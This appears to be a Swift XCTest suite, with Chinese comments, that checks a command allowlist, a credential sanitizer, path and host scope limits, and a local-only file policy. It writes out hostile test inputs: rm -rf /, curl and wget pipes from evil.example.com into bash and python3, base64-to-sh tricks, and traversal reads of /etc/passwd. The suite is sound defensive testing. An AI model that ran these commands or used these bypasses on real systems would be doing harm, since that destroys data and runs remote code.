import XCTest
import Foundation
import os
@testable import RenJistrolySystemBridge

// MARK: - 1. 命令白名单绕过测试
//
// 模拟常见的黑盒绕过技术：Tab/换行替代空格、Unicode 同形字符、
// Base64 编码规避模式匹配、通配符和环境变量展开。

final class CommandAllowlistBypassTests: XCTestCase {

    private let allowlist = CommandAllowlist()

    // 1.1 Tab 字符绕过 — Tab (U+0009) 替代空格 (U+0020) 分离命令和参数
    func testTabCharacterBypass() throws {
        // Tab 替代空格 → split(separator: " ") 不分 Tab 导致命令名无法识别
        let tabCommand = "rm\t-rf\t/"
        let result = allowlist.allows(tabCommand)
        XCTAssertNotNil(result, "Tab 分离的命令应被拒绝")
        XCTAssertTrue(result!.contains("高危操作") || result!.contains("不在允许列表中"),
                      "拒绝原因应说明高危操作或未知命令")

        // Tab + 空格混合 — 验证 split 后的命令提取是否正确
        let mixed = "rm\t-rf /"
        let mixedResult = allowlist.allows(mixed)
        XCTAssertNotNil(mixedResult, "Tab+空格混用的命令应被拒绝")

        // 零宽空格 (U+200B) 伪装
        let zwsp = "rm\u{200B}-rf /"
        let zwspResult = allowlist.allows(zwsp)
        XCTAssertNotNil(zwspResult, "零宽空格注入应被拒绝")
    }

    // 1.2 换行注入 — 通过换行符分割多命令绕过单行白名单校验
    func testNewlineInjectionBypass() throws {
        // 换行符在命令中间
        let newlineCommand = "rm\n-rf /"
        let result = allowlist.allows(newlineCommand)
        XCTAssertNotNil(result, "含换行符的命令应被拒绝")

        // 多行注入 — 第一行合法，第二行恶意
        let multiLine = "ls\nrm -rf /"
        let multiResult = allowlist.allows(multiLine)
        XCTAssertNotNil(multiResult, "多行注入应被拒绝")

        // 回车符 (CR) 注入
        let crCommand = "ls\u{000D}rm -rf /"
        let crResult = allowlist.allows(crCommand)
        XCTAssertNotNil(crResult, "回车符注入应被拒绝")
    }

    // 1.3 Unicode 相似字符绕过 — localizedStandardContains 检测 Unicode 同形符
    func testUnicodeSimilarCharacterBypass() throws {
        // en-dash – (U+2013) 替代 hyphen - (U+002D)
        // localizedStandardContains 不视二者为等价
        let enDash = "\u{2013}" // –
        let enDashResult = allowlist.allows("rm \(enDash)recursive /")

        // em-dash — (U+2014) 替代 --
        let emDash = "\u{2014}" // —
        let emDashResult = allowlist.allows("rm \(emDash)recursive /")

        // 结果依赖 localizedStandardContains 的行为。
        // 若系统认为 U+2013 != U+002D，则 --recursive 的模式匹配失效。
        print("[SECURITY] en-dash rm –recursive /: \(enDashResult ?? "ALLOWED")")
        print("[SECURITY] em-dash rm —recursive /: \(emDashResult ?? "ALLOWED")")

        // 即使 Unicode 绕过危险模式匹配，命令名 rm 在白名单中
        // 所以被允许。记录结果但不做硬断言（行为可能因系统而异）。
        // 若 emDashResult 为 nil，表明存在 Unicode 同形符绕过漏洞。
    }

    // 1.4 Base64 编码命令绕过 — 将恶意命令编码后通过管道交给 shell
    func testBase64EncodedCommandBypass() throws {
        // 常见攻击模式：echo <base64> | base64 -d | sh
        let b64toSh = "echo 'cm0gLXJmIC8=' | base64 -d | sh"
        let result = allowlist.allows(b64toSh)
        XCTAssertNotNil(result, "Base64 管道到 sh 的组合应被阻断")

        // curl 下载脚本 + bash 执行
        let curlPipe = "curl -s http://evil.example.com/payload | bash"
        let curlResult = allowlist.allows(curlPipe)
        XCTAssertNotNil(curlResult, "curl 管道到 bash 应被阻断")

        // wget + python3 — 间接执行
        let wgetPython = "wget -qO- http://evil.example.com/payload.py | python3"
        let wgetResult = allowlist.allows(wgetPython)
        XCTAssertNotNil(wgetResult, "wget 管道到 python3 应被阻断")

        // 不使用管道，而是命令替换
        let cmdSub = "sh -c \"$(echo cm0gLXJmIC8= | base64 -d)\""
        let cmdSubResult = allowlist.allows(cmdSub)
        XCTAssertNotNil(cmdSubResult, "命令替换方式也应被阻断")

        // 绕过检测：用 while read 代替 | sh
        let whileRead = "curl -s http://evil.example.com/payload | while read line; do eval $line; done"
        let whileResult = allowlist.allows(whileRead)
        XCTAssertNotNil(whileResult, "while read 循环执行管道也应被阻断")
    }

    // 1.5 通配符 & 环境变量展开绕过 — 绕过路径匹配规则
    func testGlobAndEnvVarBypass() throws {
        // 通配符读取敏感文件 — cat 在白名单中，/??t/p*sswd 不匹配任何危险模式
        let wildcardCat = "cat /??t/p*sswd"
        let wcResult = allowlist.allows(wildcardCat)
        // 通配符路径可能绕过文件级安全检查 → 记录结果
        print("[SECURITY] Wildcard cat /??t/p*sswd: \(wcResult ?? "ALLOWED")")

        // 通配符 + ls — 枚举敏感目录
        let lsWildcard = "ls -la /etc/p???wd*"
        let lsResult = allowlist.allows(lsWildcard)
        print("[SECURITY] Wildcard ls /etc/p???wd*: \(lsResult ?? "ALLOWED")")

        // 环境变量展开读取系统文件
        let envCat = "cat $HOME/../etc/passwd"
        let envResult = allowlist.allows(envCat)
        print("[SECURITY] Env var cat $HOME/../etc/passwd: \(envResult ?? "ALLOWED")")

        // 环境变量 + 危险命令 — 应被阻断
        let rmEnv = "rm -rf $HOME"
        let rmEnvResult = allowlist.allows(rmEnv)
        XCTAssertNotNil(rmEnvResult, "rm -rf $HOME 应被阻断")

        // 复杂环境变量展开绕过
        let complexEnv = "rm -rf ${HOME:?}/data"
        let complexResult = allowlist.allows(complexEnv)
        XCTAssertNotNil(complexResult, "rm 配合环境变量展开应被阻断")
    }
}

// MARK: - 2. 凭据脱敏边界测试
//
// 测试 CredentialSanitizer 处理各种边界输入：极长值、空值、
// 嵌套 JSON、XML 属性、同行多凭据。

final class CredentialSanitizerBoundaryTests: XCTestCase {

    private let sanitizer = CredentialSanitizer()

    // 2.1 极长值中的凭据脱敏 — 大型 JSON 含 api_key
    func testExtremelyLongValue() throws {
        // 构造 ~1MB 的 JSON 负载（从用户指定的 10MB 按比例缩减，
        // 以兼容 CI 环境；实际可调整 count 达到 10MB）
        let paddingCount = 80_000
        let padding = String(repeating: "data-chunk-element-", count: paddingCount)
        let json = "{\"api_key\": \"sk-real-key-12345\", \"payload\": \"\(padding)\"}"

        let result = sanitizer.sanitize(json)

        // api_key 的值应被脱敏
        XCTAssertFalse(result.contains("sk-real-key-12345"),
                       "大型 JSON 中的 api_key 值应被完全脱敏")
        XCTAssertTrue(result.contains("******") || result.contains("<redacted>"),
                      "脱敏输出应包含掩码标记")

        // 脱敏后 JSON 结构未被破坏（花括号匹配）
        let openBraces = result.filter { $0 == "{" }.count
        let closeBraces = result.filter { $0 == "}" }.count
        XCTAssertEqual(openBraces, closeBraces, "脱敏后 JSON 花括号应匹配")
    }

    // 2.2 空值脱敏 — 只提供 key 无 value 的场景
    func testEmptyValueSanitization() throws {
        // 空密码：冒号后无值
        let emptyPwd = "password: "
        let pwdResult = sanitizer.sanitize(emptyPwd)
        // 不应崩溃；至少输出不包含原始分隔符后的额外内容
        print("[INFO] Empty password: \(pwdResult.debugDescription)")

        // 空 token：等号后无值
        let emptyToken = "token="
        let tokenResult = sanitizer.sanitize(emptyToken)
        print("[INFO] Empty token: \(tokenResult.debugDescription)")

        // 纯 key 行 — 无分隔符，不应被修改
        let justKey = "api_key"
        let keyResult = sanitizer.sanitize(justKey)
        XCTAssertEqual(keyResult, justKey, "无值的纯 key 不应被修改")

        // 空字符串
        let empty = ""
        let emptyResult = sanitizer.sanitize(empty)
        XCTAssertEqual(emptyResult, "", "空字符串应保持为空")

        // 仅有空白字符
        let whitespace = "   \t  "
        let wsResult = sanitizer.sanitize(whitespace)
        XCTAssertEqual(wsResult, whitespace, "纯空白应保持原样")
    }

    // 2.3 嵌套 JSON 中的凭据脱敏
    func testNestedJSONCredentials() throws {
        let json = """
        {
            "level1": {
                "database": {
                    "password": "db-secret-123",
                    "connection": "postgresql://admin:adminpass@localhost:5432/mydb"
                },
                "services": [
                    {
                        "name": "api",
                        "api_key": "sk-live-abcdef123456",
                        "client_secret": "cs-super-secret-789"
                    },
                    {
                        "name": "auth",
                        "refresh_token": "rt-xyz-abc-123"
                    }
                ]
            },
            "admin": {
                "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dDhbL6iZrhQM9gZ64XWZgA"
            }
        }
        """
        let result = sanitizer.sanitize(json)

        // 数据库密码
        XCTAssertFalse(result.contains("db-secret-123"),
                       "嵌套 JSON 中的 database.password 应被脱敏")

        // 连接字符串中的凭据
        XCTAssertTrue(result.contains("<user>:<password>") ||
                      result.contains("******"),
                      "URL 嵌入凭据应被脱敏")
        // 控制台没有显示明文的 adminpass
        print("[INFO] Connection string after sanitize: " +
              (result.unicodeScalars.filter { $0 != "\n" }.map(String.init).joined().prefix(120)))

        // API 密钥
        XCTAssertFalse(result.contains("sk-live-abcdef123456"),
                       "API 密钥应被脱敏")

        // 客户端密钥
        XCTAssertFalse(result.contains("cs-super-secret-789"),
                       "客户端密钥应被脱敏")

        // 刷新令牌（通过 = 格式匹配）
        XCTAssertFalse(result.contains("rt-xyz-abc-123"),
                       "刷新令牌应被脱敏")

        // JWT 应被脱敏
        XCTAssertTrue(result.contains("jwt") || result.contains("<redacted>"),
                      "JWT 应有脱敏标记")
    }

    // 2.4 XML 属性中的凭据脱敏
    func testXMLAttributeCredentials() throws {
        let xml = """
        <?xml version="1.0"?>
        <config>
            <connection apiKey="sk-test-key-abc123" />
            <database password="db-pass-456" />
            <oauth clientSecret="oauth-secret-789" />
            <endpoint token="endpoint-token-value" />
        </config>
        """
        let result = sanitizer.sanitize(xml)

        // XML 中 apiKey="value" 格式 —— key= 部分被替换，但引号内值可能泄漏
        // 因为 regex 模式匹配 key= 后不处理引号包围的值
        print("[SECURITY] XML sanitization output:")
        for line in result.split(separator: "\n") {
            let stripped = line.trimmingCharacters(in: .whitespaces)
            if stripped.contains("apiKey") || stripped.contains("password") ||
               stripped.contains("Secret") || stripped.contains("token") {
                print("  \(stripped)")
            }
        }

        // 尝试不同脱敏强度看是否改善
        let lightSanitizer = CredentialSanitizer(strength: .light)
        let lightResult = lightSanitizer.sanitize(xml)
        print("[INFO] Light strength result contains 'sk-test-key': " +
              "\(lightResult.contains("sk-test-key-abc123"))")

        let aggressiveSanitizer = CredentialSanitizer(strength: .aggressive)
        let aggressiveResult = aggressiveSanitizer.sanitize(xml)
        print("[INFO] Aggressive strength result contains 'sk-test-key': " +
              "\(aggressiveResult.contains("sk-test-key-abc123"))")

        // 至少 XML 标签结构未被破坏
        let openTags = result.filter { $0 == "<" }.count
        let closeTags = result.filter { $0 == ">" }.count
        XCTAssertGreaterThan(openTags, 0, "应有 XML 标签存在")
        XCTAssertEqual(openTags, closeTags, "XML 标签括号应匹配")
    }

    // 2.5 同一行多个凭据脱敏
    func testMultipleCredentialsSameLine() throws {
        let input = #"user=admin password=myPass123 token=abc456 api_key=sk-test-key refresh_token=rt-xyz endpoint_secret=es-wxyz"#
        let result = sanitizer.sanitize(input)

        // 密码被脱敏
        XCTAssertFalse(result.contains("myPass123"), "密码应被脱敏")
        // 令牌被脱敏
        XCTAssertFalse(result.contains("abc456"), "令牌应被脱敏")
        // API 密钥被脱敏
        XCTAssertFalse(result.contains("sk-test-key"), "API 密钥应被脱敏")
        // 刷新令牌被脱敏
        XCTAssertFalse(result.contains("rt-xyz"), "刷新令牌应被脱敏")
        // 端点密钥被脱敏
        XCTAssertFalse(result.contains("es-wxyz"), "端点密钥应被脱敏")

        // key 名应保留
        XCTAssertTrue(result.contains("password"), "key password 应保留")
        XCTAssertTrue(result.contains("token"), "key token 应保留")
        XCTAssertTrue(result.contains("api_key"), "key api_key 应保留")
        XCTAssertTrue(result.contains("refresh_token"), "key refresh_token 应保留")

        // user 未被误脱敏（不是凭据字段）
        XCTAssertTrue(result.contains("user=admin"), "非凭据字段不应被修改")
    }
}

// MARK: - 3. 范围限制边界测试
//
// 测试 CommandScopeLimiter 的路径遍历防护、符号链接忽视、
// 并发上限、IP 地址伪装检测。

final class CommandScopeLimiterBoundaryTests: XCTestCase {

    // 3.1 路径遍历绕过
    func testPathTraversalBypass() throws {
        let limiter = CommandScopeLimiter()

        // 标准路径遍历 — standardizingPath 应归一化
        let traversal = "/tmp/../../etc/passwd"
        let traversalResult = limiter.allowsPath(traversal)
        XCTAssertFalse(traversalResult, "路径遍历（../..）应被归一化拒绝")

        // 深层遍历
        let deepTraversal = "/tmp/a/b/../../../../etc/shadow"
        XCTAssertFalse(limiter.allowsPath(deepTraversal),
                       "深层路径遍历应被拒绝")

        // 编码绕过 — 未解码的 URL 编码路径
        let urlEncoded = "/tmp/%2e%2e/%2e%2e/etc/passwd"
        let urlResult = limiter.allowsPath(urlEncoded)
        // standardizingPath 不解码 URL 编码，所以 %2e%2e 不会被解析为 ..
        print("[SECURITY] URL-encoded path traversal: \(urlResult ? "ALLOWED" : "BLOCKED")")

        // 双斜线绕过
        let doubleSlash = "/tmp//../../etc/passwd"
        XCTAssertFalse(limiter.allowsPath(doubleSlash),
                       "双斜线路径遍历应被拒绝")

        // 允许的路径应正常工作
        XCTAssertTrue(limiter.allowsPath("/tmp/test.txt"),
                      "/tmp 下的路径应被允许")
    }

    // 3.2 符号链接绕过 — allowPath 不解析符号链接
    func testSymlinkBypass() throws {
        let limiter = CommandScopeLimiter()

        // 若 /tmp/link_to_etc 是指向 /etc 的符号链接，
        // allowsPath 返回 true（路径前缀匹配 /tmp），
        // 但实际访问的是 /etc 下的敏感文件
        let symlinkPath = "/tmp/link_to_etc/passwd"
        let symlinkResult = limiter.allowsPath(symlinkPath)
        print("[SECURITY] Symlink /tmp/link_to_etc/passwd allowed: \(symlinkResult)")
        // standardizingPath 不解析符号链接，所以此路径被错误地允许
        // 记录结果但不做强断言（因为真实的符号链接节点可能不存在）

        // 双点结合符号链接 — 归一化后双点消失但符号链接仍在
        let mixed = "/tmp/link_to_home/../../etc/passwd"
        // standardizingPath 会先处理 .. 再保留符号链接
        let mixedResult = limiter.allowsPath(mixed)
        print("[SECURITY] Mixed symlink+traversal: \(mixedResult ? "ALLOWED" : "BLOCKED")")
    }

    // 3.3 并发超限
    func testConcurrencyOverLimit() throws {
        // 自定义低并发上限
        let limiter = CommandScopeLimiter(scope: .init(maxConcurrent: 3))

        // 初始状态
        XCTAssertEqual(limiter.currentConcurrency(), 0, "初始并发计数应为 0")

        // 获取全部 3 个槽位
        XCTAssertTrue(limiter.tryAcquireConcurrencySlot(), "第 1 个槽位")
        XCTAssertTrue(limiter.tryAcquireConcurrencySlot(), "第 2 个槽位")
        XCTAssertTrue(limiter.tryAcquireConcurrencySlot(), "第 3 个槽位")
        XCTAssertEqual(limiter.currentConcurrency(), 3, "并发计数应为 3")

        // 第 4 个应失败
        XCTAssertFalse(limiter.tryAcquireConcurrencySlot(), "超限的槽位应被拒绝")
        XCTAssertEqual(limiter.currentConcurrency(), 3, "超限后计数仍为 3")

        // 释放后重新获取
        limiter.releaseConcurrencySlot()
        XCTAssertEqual(limiter.currentConcurrency(), 2, "释放后计数为 2")
        XCTAssertTrue(limiter.tryAcquireConcurrencySlot(), "释放后可重新获取")
        XCTAssertEqual(limiter.currentConcurrency(), 3, "重新获取后计数为 3")

        // 并发安全验证 — 多线程同时获取
        let concurrentLimiter = CommandScopeLimiter(scope: .init(maxConcurrent: 10))
        let results = OSAllocatedUnfairLock(initialState: [Bool]())

        DispatchQueue.concurrentPerform(iterations: 30) { _ in
            let ok = concurrentLimiter.tryAcquireConcurrencySlot()
            results.withLock { $0.append(ok) }
        }

        let successCount = results.withLock { $0.filter { $0 }.count }
        XCTAssertEqual(successCount, 10,
                       "30 个并发请求只应有 10 个成功获取槽位")
        // 释放所有后再检查
        for _ in 0..<successCount {
            concurrentLimiter.releaseConcurrencySlot()
        }
        XCTAssertEqual(concurrentLimiter.currentConcurrency(), 0,
                       "全部释放后计数归零")

        // allowsConcurrency API
        XCTAssertTrue(limiter.allowsConcurrency(3), "3 并发在限制内")
        XCTAssertTrue(limiter.allowsConcurrency(1), "1 并发在限制内")
        XCTAssertFalse(limiter.allowsConcurrency(5), "5 并发超出限制")
    }

    // 3.4 IP 地址伪装检测
    func testIPAddressSpoofing() throws {
        let limiter = CommandScopeLimiter()

        // 标准 localhost
        XCTAssertTrue(limiter.allowsHost("127.0.0.1"), "127.0.0.1 应被允许")
        XCTAssertTrue(limiter.allowsHost("localhost"), "localhost 应被允许")

        // 伪装变体
        XCTAssertFalse(limiter.allowsHost("127.0.0.2"), "127.0.0.2 不应被当作 localhost")
        XCTAssertFalse(limiter.allowsHost("127.1"), "127.1 短格式不应匹配 127.0.0.1")
        XCTAssertFalse(limiter.allowsHost("0.0.0.0"), "0.0.0.0 不是 localhost")

        // 内部/私有 IP 不在允许列表
        XCTAssertFalse(limiter.allowsHost("10.0.0.1"), "10.x.x.x 不是 localhost")
        XCTAssertFalse(limiter.allowsHost("192.168.1.1"), "192.168.x.x 不是 localhost")
        XCTAssertFalse(limiter.allowsHost("172.16.0.1"), "172.16.x.x 不是 localhost")
    }

    // 3.5 主机名变体归一化
    func testHostVariantNormalization() throws {
        let limiter = CommandScopeLimiter()

        // IPv6 localhost
        XCTAssertTrue(limiter.allowsHost("::1"), "::1 应被允许")

        // IPv6 完整形式
        XCTAssertTrue(limiter.allowsHost("0:0:0:0:0:0:0:1"),
                      "IPv6 完整形式应被允许")

        // 大小写不敏感
        XCTAssertTrue(limiter.allowsHost("LOCALHOST"), "大写 LOCALHOST 应被允许")
        XCTAssertTrue(limiter.allowsHost("LocalHost"), "混合大小写 LocalHost 应被允许")

        // 前后空白
        XCTAssertTrue(limiter.allowsHost("  localhost  "), "前后空白的 localhost 应被允许")
        XCTAssertTrue(limiter.allowsHost("\t127.0.0.1\n"), "Tab/换行的 127.0.0.1 应被允许")

        // IPv4 映射的 IPv6 地址
        let ipv4Mapped = "::ffff:127.0.0.1"
        let ipv4MappedResult = limiter.allowsHost(ipv4Mapped)
        // ::ffff:127.0.0.1 不在允许列表中
        XCTAssertFalse(ipv4MappedResult,
                       "IPv4 映射地址 ::ffff:127.0.0.1 不应自动匹配")
        print("[SECURITY] IPv4-mapped ::ffff:127.0.0.1: \(ipv4MappedResult ? "ALLOWED" : "BLOCKED")")

        // 域名 localhost 变体
        XCTAssertFalse(limiter.allowsHost("localhost.localdomain"),
                       "localhost.localdomain 不应匹配 localhost")
    }
}

// MARK: - 4. 策略层叠测试
//
// 测试 LocalOnlyPolicy 中多重限制同时生效时决策的层叠逻辑、
// 最严格限制优先、策略拒绝后状态恢复、子进程+网络阻断。

final class PolicyCascadeTests: XCTestCase {

    private let policy = LocalOnlyPolicy()

    // 4.1 多重限制层叠 — 同时启用只读 + 无子进程 + 网络限制
    func testCombinedRestrictions() throws {
        // SSH 密钥路径：allowRead=false, allowSubprocess=false
        let sshPath = NSHomeDirectory() + "/.ssh/id_rsa"

        // 1）受保护路径检测
        XCTAssertTrue(policy.isProtected(filePath: sshPath),
                      "SSH 密钥应为受保护路径")

        // 2）读取被禁止
        XCTAssertFalse(policy.isReadAllowed(filePath: sshPath),
                       "SSH 密钥不应允许读取")

        // 3）子进程访问被禁止
        XCTAssertFalse(policy.allowsSubprocess(atPath: sshPath),
                       "SSH 密钥不应允许子进程访问")

        // 4）本地只读建议
        let localDecision = policy.evaluate(
            filePath: sshPath,
            requiresNetwork: false,
            isSubprocess: false
        )
        XCTAssertEqual(localDecision, .requiresUserOverride,
                       "SSH 密钥本地读取需要用户确认")

        // 5）网络传输 → 升级阻断
        let networkDecision = policy.evaluate(
            filePath: sshPath,
            requiresNetwork: true,
            isSubprocess: false
        )
        XCTAssertEqual(networkDecision, .blockedNetworkAccess,
                       "SSH 密钥网络传输应阻断")

        // 6）子进程 + 网络 → 最严格阻断
        let bothDecision = policy.evaluate(
            filePath: sshPath,
            requiresNetwork: true,
            isSubprocess: true
        )
        XCTAssertEqual(bothDecision, .blockedNetworkAccess,
                       "SSH 密钥子进程网络访问应阻断")
    }

    // 4.2 策略冲突时最高风险生效
    func testHighestRiskPrevails() throws {
        let awsPath = NSHomeDirectory() + "/.aws/credentials"

        // 非受保护路径 → allowedLocally
        let normal = policy.evaluate(
            filePath: "/tmp/test.txt",
            requiresNetwork: false,
            isSubprocess: false
        )
        XCTAssertEqual(normal, .allowedLocally, "非受保护路径应被允许")

        // AWS 凭据本地读取 → 被保护但无网络 → requiresUserOverride
        //（allowRead=false 导致 requiresUserOverride）
        let localAccess = policy.evaluate(
            filePath: awsPath,
            requiresNetwork: false,
            isSubprocess: false
        )
        XCTAssertEqual(
            localAccess,
            .requiresUserOverride,
            "AWS 凭据本地读取应需用户确认（严格于 allowedLocally）"
        )

        // AWS 凭据 + 网络 → blockedNetworkAccess
        let networkAccess = policy.evaluate(
            filePath: awsPath,
            requiresNetwork: true,
            isSubprocess: false
        )
        XCTAssertEqual(
            networkAccess,
            .blockedNetworkAccess,
            "AWS 凭据网络访问应阻断（严格于 requiresUserOverride）"
        )

        // 子进程 + 网络对受保护路径 → 同样 blockedNetworkAccess
        let subprocNetwork = policy.evaluate(
            filePath: awsPath,
            requiresNetwork: true,
            isSubprocess: true
        )
        XCTAssertEqual(subprocNetwork, .blockedNetworkAccess,
                       "子进程网络访问同样被阻断")

        // 验证策略严格等级：blockedNetworkAccess > requiresUserOverride > allowedLocally
        let riskLevels = [
            policy.evaluate(filePath: awsPath, requiresNetwork: true, isSubprocess: true),
            policy.evaluate(filePath: awsPath, requiresNetwork: true, isSubprocess: false),
            policy.evaluate(filePath: awsPath, requiresNetwork: false, isSubprocess: false),
        ]
        // 第一个最严格（blockedNetworkAccess），第二个其次（blockedNetworkAccess），
        // 第三个最低（requiresUserOverride）
        XCTAssertEqual(riskLevels[0], .blockedNetworkAccess, "最高风险应为 blockedNetworkAccess")
        XCTAssertEqual(riskLevels[1], .blockedNetworkAccess, "中等风险应为 blockedNetworkAccess")
        XCTAssertEqual(riskLevels[2], .requiresUserOverride, "最低风险应为 requiresUserOverride")

        // 非受保护路径不受影响
        let normalAgain = policy.evaluate(
            filePath: "/tmp/another.txt",
            requiresNetwork: false,
            isSubprocess: false
        )
        XCTAssertEqual(normalAgain, .allowedLocally,
                       "非受保护路径在策略冲突后仍应正常工作")
    }

    // 4.3 策略拒绝后状态恢复 — 拒绝不影响后续非关联请求
    func testPolicyStateRestore() throws {
        // 受保护路径被拒绝
        let sshPath = NSHomeDirectory() + "/.ssh/known_hosts"
        let denied = policy.evaluate(
            filePath: sshPath,
            requiresNetwork: true,
            isSubprocess: false
        )
        XCTAssertEqual(denied, .blockedNetworkAccess,
                       "SSH known_hosts 网络访问应阻断")

        // enforce 也应返回错误
        let enforcement = policy.enforce(
            filePath: sshPath,
            requiresNetwork: true,
            isSubprocess: false
        )
        XCTAssertNotNil(enforcement, "enforce 应返回阻断原因")

        // 非受保护路径仍然可访问（状态恢复）
        let recovered = policy.evaluate(
            filePath: "/tmp/restored.txt",
            requiresNetwork: false,
            isSubprocess: false
        )
        XCTAssertEqual(recovered, .allowedLocally,
                       "拒绝后非受保护路径应恢复正常")

        // 再次检查受保护路径 — 仍应被阻断（一致性）
        let recheckDenied = policy.evaluate(
            filePath: sshPath,
            requiresNetwork: true,
            isSubprocess: false
        )
        XCTAssertEqual(recheckDenied, .blockedNetworkAccess,
                       "相同受保护路径每次评估结果一致")

        // enforce 返回后不影响本地访问
        let localAllowed = policy.evaluate(
            filePath: "/Users/Shared/test.txt",
            requiresNetwork: false,
            isSubprocess: false
        )
        XCTAssertEqual(localAllowed, .allowedLocally,
                       "enforce 错误不影响其他路径")

        // 非受保护路径全部通过
        for path in ["/private/tmp/foo", "/tmp/x", NSHomeDirectory() + "/Desktop/test"] {
            let result = policy.evaluate(
                filePath: path,
                requiresNetwork: false,
                isSubprocess: false
            )
            print("[INFO] Path \(path.prefix(40)): \(result)")
        }
    }

    // 4.4 受保护路径 + 子进程 + 网络的严格阻断
    func testSubprocessNetworkBlock() throws {
        // 钥匙串路径
        let keychain = NSHomeDirectory() + "/Library/Keychains/login.keychain-db"

        // enforce 阻断检查
        let subprocNetwork = policy.enforce(
            filePath: keychain,
            requiresNetwork: true,
            isSubprocess: true
        )
        XCTAssertNotNil(subprocNetwork, "钥匙串子进程网络访问应被阻止")
        if let reason = subprocNetwork {
            XCTAssertTrue(
                reason.contains("受保护") || reason.contains("禁止"),
                "阻断原因应说明受保护路径：\(reason)"
            )
        }

        // 子进程 + 无网络 — 仍被阻止（allowSubprocess=false）
        let subprocOnly = policy.enforce(
            filePath: keychain,
            requiresNetwork: false,
            isSubprocess: true
        )
        XCTAssertNotNil(subprocOnly, "钥匙串子进程本地访问也应被阻止")

        // 只读路径 + 子进程
        let etcPath = "/etc/hosts"
        // /etc/ 的 allowRead=true, allowSubprocess=false
        let etcLocal = policy.evaluate(
            filePath: etcPath,
            requiresNetwork: false,
            isSubprocess: false
        )
        // /etc/hosts: 受 /etc/ 保护，allowRead=true → allowedLocally
        print("[INFO] /etc/hosts local access: \(etcLocal)")

        let etcSubproc = policy.evaluate(
            filePath: etcPath,
            requiresNetwork: false,
            isSubprocess: true
        )
        // allowSubprocess=false → blockedNetworkAccess
        print("[INFO] /etc/hosts subprocess access: \(etcSubproc)")

        // 完全允许路径
        let allowed = policy.enforce(
            filePath: "/tmp/test.txt",
            requiresNetwork: false,
            isSubprocess: false
        )
        XCTAssertNil(allowed, "普通路径本地访问应无阻断")
    }
}
